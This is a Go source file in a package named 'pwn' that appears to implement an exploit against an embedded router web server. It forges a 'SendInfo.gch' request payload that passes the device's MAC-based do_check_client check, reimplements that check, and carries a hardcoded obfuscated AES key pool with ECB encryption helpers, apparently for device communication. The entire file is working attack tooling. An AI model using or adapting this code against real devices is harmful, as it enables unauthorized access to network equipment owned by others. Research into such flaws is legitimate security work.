package pwn

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
)

var KEY_POOL = []byte{
	0x9c, 0x33, 0x75, 0xd1, 0x1c, 0x42, 0x45, 0x37, 0x18, 0x48,
	0x91, 0x73, 0x17, 0x45, 0x79, 0x44, 0x43, 0xd7, 0xd5, 0x73,
	0x33, 0x54, 0x76, 0xd2, 0xc5, 0xf1, 0x2c, 0x4f, 0x7a, 0xba,
	0x61, 0xd9, 0x5c, 0x69, 0xdf, 0x8c, 0xd2, 0x1c, 0xde, 0x3b,
	0x35, 0x2d, 0x2f, 0xe1, 0xde, 0x4c, 0x77, 0xf5, 0x1a, 0x65,
	0xd1, 0xfe, 0x18, 0x43, 0x8e, 0xa7, 0x42, 0x08, 0x04, 0x78,
	0xd5, 0xe4, 0xf3, 0x34, 0xa4, 0xd3, 0xf2, 0x36, 0x47, 0x6d,
	0x86, 0x9d, 0x42, 0x65, 0x13, 0x42, 0xdc, 0x42, 0x99, 0x48,
	0xdc, 0x67, 0x9f, 0x9e, 0xdc, 0x46, 0x37, 0x5f, 0x84, 0x9f,
	0x6f, 0x76, 0xce, 0x79, 0x4f, 0x49,
}

func noneMap(i int) int {
	return i
}
func byteMap(i int) int {
	return i & 0xff
}
func evaluateAlphabet(alphabet string, exponent int, modulus int, valueMap func(i int) int) map[int]int {
	possibleValues := make(map[int]int)
	alphabetBytes := []byte(alphabet)

	// Generate all possible 4-byte combinations of alphabet
	for _, b1 := range alphabetBytes {
		for _, b2 := range alphabetBytes {
			for _, b3 := range alphabetBytes {
				for _, b4 := range alphabetBytes {
					combination := []byte{b1, b2, b3, b4}
					num := intLittle(combination)
					result := valueMap(modPow(num, exponent, modulus))

					if _, exists := possibleValues[result]; !exists {
						possibleValues[result] = num
					}
				}
			}
		}
	}

	return possibleValues
}
func intLittle(data []byte) int {
	var result int
	for i := len(data) - 1; i >= 0; i-- {
		result = (result << 8) | int(data[i])
	}
	return result
}
func intFromBytes(data []byte, order string) int {
	var result int
	if order == "little" {
		for i := len(data) - 1; i >= 0; i-- {
			result = (result << 8) | int(data[i])
		}
	} else { // big endian
		for i := 0; i < len(data); i++ {
			result = (result << 8) | int(data[i])
		}
	}
	return result
}

func modPow(base, exp, mod int) int {
	result := 1
	base %= mod
	for exp > 0 {
		if exp%2 == 1 {
			result = (result * base) % mod
		}
		exp >>= 1
		base = (base * base) % mod
	}
	return result
}

const alphabet = "lmaoztebcdfghijknpqrsuvwxy"
const modulus = 0x1687
const modulus2 = 0x7561

var headerEncodingMap, macEncodingMap map[int]int

func init() {
	headerEncodingMap = evaluateAlphabet(alphabet, modulus, modulus2, noneMap)
	macEncodingMap = evaluateAlphabet(alphabet, 0x1, modulus, byteMap)
}

func CreatePayloadArray(localMac, remoteMac []byte, calculatedIdx int) []int {
	var payload []int

	// exponent
	payload = append(payload, headerEncodingMap[0]) // input1; cancels out calculated_idx
	payload = append(payload, headerEncodingMap[1]) // input2; selected exponent

	// modulus
	payload = append(payload, headerEncodingMap[0])       // input3; cancels out calculated_idx
	payload = append(payload, headerEncodingMap[modulus]) // input4; selected modulus

	// Add local and remote MAC addresses to payload
	macBytes := append(localMac, remoteMac...)
	macBytes = append(macBytes, remoteMac...)

	for _, b := range macBytes {
		payload = append(payload, macEncodingMap[int(b)])
	}

	return payload
}

// VerifyDoCheckClient should be a faithful implementation of what is implemented in the vm bytecode for
// do_check_client in the httpd binary.
func VerifyDoCheckClient(clientData []int, remoteMacAddress []byte, calculatedIdx int, localMacAddress []byte) bool {
	processedWord0 := modPow(clientData[0], modulus, modulus2)
	processedWord1 := modPow(clientData[1], modulus, modulus2)
	processedWord2 := modPow(clientData[2], modulus, modulus2)
	processedWord3 := modPow(clientData[3], modulus, modulus2)

	derivedExponent := (processedWord0 * calculatedIdx) + processedWord1
	derivedModulus := (processedWord2 * calculatedIdx) + processedWord3

	clientData = clientData[4:]
	remainingWordLen := len(clientData)
	workBuffer := make([]byte, len(clientData))

	if remainingWordLen < 6 {
		fmt.Printf("Warning: Remaining client_data words are less than 6\n")
		return false
	}

	for i := 0; i < 6; i++ {
		workBuffer[i] = byte(modPow(clientData[i], derivedExponent, derivedModulus) & 0xFF)
	}

	calculatedLocalMac := workBuffer[:6]
	if string(calculatedLocalMac) != string(localMacAddress) {
		fmt.Printf("local mismatch %x != %x\n", calculatedLocalMac, localMacAddress)
		return false
	}

	for i := 6; i < remainingWordLen; i++ {
		workBuffer[i] = byte(modPow(clientData[i], derivedExponent, derivedModulus) & 0xFF)

		if i >= 6 && (i+1)%6 == 0 {
			calculatedRemoteMac := workBuffer[i-5 : i+1]
			if string(calculatedRemoteMac) != string(remoteMacAddress) {
				fmt.Printf("local mismatch %x != %x\n", calculatedRemoteMac, remoteMacAddress)
				continue
			}
			return true
		}
	}

	return false
}
func ParseMac(inputStr string) ([]byte, error) {
	cleaned := strings.ReplaceAll(inputStr, ":", "")
	if len(cleaned)%2 != 0 {
		return nil, fmt.Errorf("invalid mac: %s", inputStr)
	}
	rawBytes, err := hex.DecodeString(cleaned)
	if err != nil {
		return nil, fmt.Errorf("invalid mac: %s", inputStr)
	}
	if len(rawBytes) != 6 {
		return nil, fmt.Errorf("invalid mac: %s", inputStr)
	}
	return rawBytes, nil
}

func GenerateAesKey(index int) cipher.Block {
	endIndex := index + 24
	if endIndex > len(KEY_POOL) {
		endIndex = len(KEY_POOL)
	}

	selectedKeys := KEY_POOL[index:endIndex]
	aesKey := make([]byte, len(selectedKeys))

	for i, x := range selectedKeys {
		aesKey[i] = (x ^ 0xA5) & 0xFF
	}

	b := createAesEcbCipher(aesKey)
	return b
}

func createAesEcbCipher(aesKey []byte) cipher.Block {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		panic(err) // 或者适当处理错误
	}
	return block
}

func BuildPayloadString(payloadArr []int) string {
	payloadBytes := make([]byte, len(payloadArr)*4)
	for i, val := range payloadArr {
		binary.LittleEndian.PutUint32(payloadBytes[i*4:(i+1)*4], uint32(val))
	}

	payloadStr := string(payloadBytes)
	return fmt.Sprintf("SendInfo.gch?info=%d|%s", len(payloadArr), payloadStr)
}

func EncryptAES(block cipher.Block, data []byte) ([]byte, error) {
	// 使用零填充
	blockSize := block.BlockSize()
	paddingLen := blockSize - (len(data) % blockSize)
	if paddingLen == blockSize {
		paddingLen = 0
	}

	// 填充零字节
	for i := 0; i < paddingLen; i++ {
		data = append(data, 0)
	}

	// ECB模式加密
	ciphertext := make([]byte, len(data))
	for i := 0; i < len(data); i += blockSize {
		block.Encrypt(ciphertext[i:i+blockSize], data[i:i+blockSize])
	}

	return ciphertext, nil
}

func DecryptAES(block cipher.Block, data []byte) ([]byte, error) {
	blockSize := block.BlockSize()
	if len(data)%blockSize != 0 {
		paddingLen := blockSize - (len(data) % blockSize)
		for i := 0; i < paddingLen; i++ {
			data = append(data, 0)
		}
	}

	plaintext := make([]byte, len(data))
	for i := 0; i < len(data); i += blockSize {
		block.Decrypt(plaintext[i:i+blockSize], data[i:i+blockSize])
	}

	// 移除零填充
	for len(plaintext) > 0 && plaintext[len(plaintext)-1] == 0 {
		plaintext = plaintext[:len(plaintext)-1]
	}

	return plaintext, nil
}
